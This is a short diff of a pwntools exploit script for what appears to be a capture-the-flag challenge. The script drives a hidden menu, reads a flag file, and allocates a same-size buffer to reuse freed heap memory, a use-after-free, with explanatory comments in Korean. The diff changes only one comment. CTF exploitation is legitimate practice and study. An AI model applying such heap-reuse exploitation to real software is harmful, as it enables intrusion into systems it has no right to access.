@@ -16,7 +16,7 @@ r.sendline("275") # 히든메뉴로 들어가서
 print r.recv()
 r.sendline("/home/pwnlibrary/flag.txt") # 파일의 내용을 읽어오는데
 print r.recv()
-r.sendline("256") # 받은 size 만큼 malloc으로 할당하는 부분이 있는데 use after free 버그를 사용하기 위해 0x100만큼 읽어옴 
+r.sendline("256") # 받은 size 만큼 malloc으로 할당하는 부분이 있는데 같은 사이즈면 free했던 공간을 그대로 사용하기 때문에 0x100만큼 읽어옴 
 print r.recv()
 r.sendline("2") # 읽어온 책 내용읽기 위해 read menu로 들어감
 print r.recv()
